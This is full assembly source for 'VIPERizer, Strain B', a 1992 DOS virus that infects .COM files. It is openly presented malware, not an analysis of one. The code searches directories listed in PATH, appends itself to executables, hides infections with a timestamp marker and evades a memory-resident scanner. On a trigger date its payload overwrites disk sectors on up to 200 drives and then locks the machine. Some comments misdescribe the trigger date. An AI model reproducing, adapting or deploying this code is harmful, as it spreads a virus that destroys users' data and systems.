;
; VIPERizer, Strain B
; Copyright (c) 1992, Stingray/VIPER
; This is a Viral Inclined Programming Experts Ring Programming Team Production
; 
; VIPER are:  Stingray, Venom, and Guido Sanchez
;

MOV_CX  MACRO   X         ; Here is just a simple "mov cx,xxxx" macro.
        DB      0B9H
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

VCODE:  JMP     virus

        NOP         ; just a dud for the 'infected' file.

v_start equ     $


virus:  PUSH    CX
        mov     ax,0ff0fh               ;  Thanks to RABID... Change Mem Marker
        int     21h
        cmp     ax,101h                 ;  Is VirexPC/FluShit in memory?
        jne     more_virus              ;  Nope.
        jmp     quit                    ;  FUCK!!!!!
more_virus:
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
                                        ; The 2nd and 3rd bytes get modified.
        CLD                             ;Pointers will be auto INcremented
        MOV     SI,DX                   ;Access data as offset from SI
        ADD     SI,first_3              ;Point to original 1st 3 bytes of .COM
        MOV     DI,OFFSET 100H          ;`cause all .COM files start at 100H
        mov     cx,3
        REPZ    MOVSB                   ;Restore original first 3 bytes of .COM
        MOV     SI,DX                   ;Keep SI pointing to the data area

        MOV     AH,30H
        INT     21H
        nop
        CMP     AL,0                    ;0 means it's version 1.X
        JNZ     dos_ok                  ;For version 2.0 or greater
        JMP     quit                    ;Don't try to infect version 1.X
dos_ok:
        mov     ah,2ch                  ;  Get Time
        int     21h                     ;  Do it.
        xor     bx,bx                   ;  VIPERize bx, for later use.
        cmp     dl,4                    ;  hund's of seconds 4?
        jle     print_message           ;  If 4 or less, print a message.
                                        ;  This serves as a random 1 in 20
                                        ;  chance of the message printing
        jmp     short get_date          ;  No?  What date is it...?
print_message:
        mov     dl, byte ptr [si+msg+bx] ; Get a byte of our message...
        or      dl,dl                   ;  is it 0? (end of message)
        jz      get_date                ;  Get the date if it is...
        sub     dl,75                   ;  Unencrypt message
        mov     ah,2                    ;  Prepare to print one letter
        int     21h                     ;  do it!
        inc     bx                      ;  point to next character.
        jmp     short print_message     ;  Do it again.
get_date:
        mov     ah,2ah                  ;  What day is it?
        int     21h                     ;  Find out.
        cmp     dh,3                    ;  Is it february?
        jne     resume                  ;  No?  Oh well.
        cmp     dl,24                   ;  Is it valentines day?
        jne     resume                  ;  No?  Damn.
        mov     ah,2ch                  ;  What time is it?
        int     21h                     ;  Find out.
        cmp     ch,7                    ;  Is it 7 hours?
        jne     resume                  ;  No? C'est la vie...
        cmp     cl,45                   ;  Is it 45 minutes?
        jne     resume                  ;  No? Too Bad...
        xor     bx,bx                   ;  VIPERize bx
cool:
        mov     dl,byte ptr [si+msg2+bx] ; This is pretty much the
        or      dl,dl                   ;  same as the above 'print'
        jz      no_mas                  ;  function.  except I didn't
        sub     dl,75                   ;  make it a procedure.
        mov     ah,2
        int     21h
        inc     bx
        jmp     short cool
no_mas:
        mov     al,0                    ;  Start with drive default
phri:   
        mov     cx,255                  ;  Nuke a few sectors
        mov     dx,1                    ;  Beginning with sector 1!!!
        int     26h                     ;  VIPERize them!!!! Rah!!!
        jc      error                   ;  Uh oh. Problem.
        add     sp,2                    ;  Worked great.  Clear the stack...
error:
        inc     al                      ;  Get another drive!
        cmp     al,200                  ;  Have we fried 200 drives?
        je      done_phrying            ;  Yep.
        jmp     short phri              ;  Nope.
done_phrying:
        cli                             ;  Disable Interrupts
        hlt                             ;  Lock up computer.
resume:
        PUSH    ES
        MOV     AH,2FH
        INT     21H
        nop
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         ;Save the DTA address
        POP     ES
        MOV     DX,dta                  ;Offset of new DTA in virus data area
        nop
        ADD     DX,SI                   ;Compute DTA address
        MOV     AH,1AH
        INT     21H                     ;Set new DTA to inside our own code
        nop
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    ;ES:DI points to environment
find_path:
        POP     SI
        PUSH    SI                      ;Get SI back
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        nop
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4
check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        nop
        LOOP    check_next_4            ;Loop to check the next character
        POP     SI
        POP     ES
        nop
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        nop
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok
set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done
found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        nop
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace
move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        nop
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir
moved_last_one:
        xor     si,si
moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP
        CMP     CH,'\'                  ;Ends with "\"?
        nop
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB
slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        nop
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden OK
        INT     21H
        nop
        JMP     SHORT   find_first
find_next:
        MOV     AH,4FH
        INT     21H
        nop
find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory
found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1FH                  ;Mask to remove all but seconds
        CMP     AL,1FH                  ;62 seconds -> already infected
        JZ      find_next               ;If so, go find another file
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        nop
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name
more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        nop
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
        ADD     DX,SI
        INT     21H
        nop
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        nop
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        nop
        MOV     AX,OFFSET 3D02H         ;Read/Write
        nop
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        nop
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        nop
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,3FH
        nop
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area
        nop
        JB      fix_time_stamp  ;Quit, if read failed
        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not
        MOV     AX,OFFSET 4202H
        xor     cx,cx
        xor     dx,dx
        INT     21H
        nop
        JB      fix_time_stamp  ;Quit, if it didn't work
        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction
        nop
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm
        MOV     AH,40H
        MOV_CX  virlen                  ;Length of virus, in bytes
        nop
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ; address of virus code in memory
        INT     21H
        nop
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        xor     cx,cx
        xor     dx,dx
        INT     21H
        nop
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        nop
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
        INT     21H
        nop
fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        nop
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        nop
        OR      CX,1FH                  ;Seconds = 31/30 min = 62 seconds
        MOV     AX,OFFSET 5701H
        INT     21H
        nop
        MOV     AH,3EH
        INT     21H
        nop
fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        nop
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to \path\name in workspace
        INT     21H
        nop
all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        nop
        MOV     DS,[SI+old_dts]
        INT     21H
        nop
        POP     DS
        nop
quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        xor     cx,cx
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH
vir_dat EQU     $
olddta_ DW      0                       ;Old DTA offset
olddts_ DW      0                       ;Old DTA segment
oldtim_ DW      0                       ;Old Time
oldate_ DW      0                       ;Old date
oldatt_ DW      0                       ;Old file attributes
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    ;Start of JMP instruction
jmpdsp_ DW      0                       ;The displacement part
fspec_  DB      '*.COM',0
pathad_ DW      0                       ;Path address
namptr_ DW      0                       ;Pointer to start of file name
envstr_ DB      'PATH='                 ;Find this in the environment
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             ;Temporary DTA goes here
dtatim_ DW      0,0                     ;Time stamp in DTA
dtalen_ DW      0,0                     ;File length in the DTA
dtanam_ DB      0Dh dup (0)             ;File name in the DTA
reboot_ DB      0EAH,0F0H,0FFH,0FFH,0FFH ;Five byte FAR JMP to FFFF:FFF0

_msg    db  158,186,189,189,196,107,191,179,180,190,107,174,186,184,187,192
        db  191,176,189,107,180,190,107,185,186,107,183,186,185,178,176,189
        db  107,186,187,176,189,172,191,180,186,185,172,183,107,175,192,176
        db  107,191,186,107,172,185,107,186,192,191,173,189,176,172,182,107
        db  186,177,088,141,192,190,179,180,190,179,180,189,186,088,147,172
        db  193,176,107,172,107,153,148,142,144,107,175,172,196,121,121,121
        db  088
        db  0

_msg2   db  161,148,155,144,157,180,197,176,189,119,107,158,191,189,172,180
        db  185,107,141,085,088
        db  115,174,116,107,124,132,132,125,119,107,158,191,180,185,178,189
        db  172,196,122,161,148,155,144,157,085,088
        db  147,172,187,187,196,107,161,172,183,176,185,191,180,185,176,190
        db  107,143,172,196,108,085,088
        db  0


lst_byt EQU     $                       ;All lines that assemble into code are
                                        ;  above this one

virlen  =       lst_byt - v_start       ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start       ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2   ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H ;Code length + 100h, for PSP
old_dta =       olddta_ - vir_dat       ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat       ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat       ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat       ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat       ;Displacement to old attributes
first_3 =       first3_ - vir_dat       ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat       ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat       ;Displacement to the 2nd 2 bytes of JMP
f_spec  =       fspec_  - vir_dat       ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat       ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat       ;Displacement to the filename pointer
env_str =       envstr_ - vir_dat       ;Displacement to the "PATH=" string
wrk_spc =       wrkspc_ - vir_dat       ;Displacement to the filename workspace
dta     =       dta_    - vir_dat       ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat       ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat       ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat       ;Displacement to the name in the DTA
reboot  =       reboot_ - vir_dat       ;Displacement to the 5 byte reboot code
msg     =       _msg    - vir_dat       ; Disp. to 1st msg
msg2    =       _msg2   - vir_dat       ; Disp. to 2nd msg
        CODE    ENDS
END     VCODE
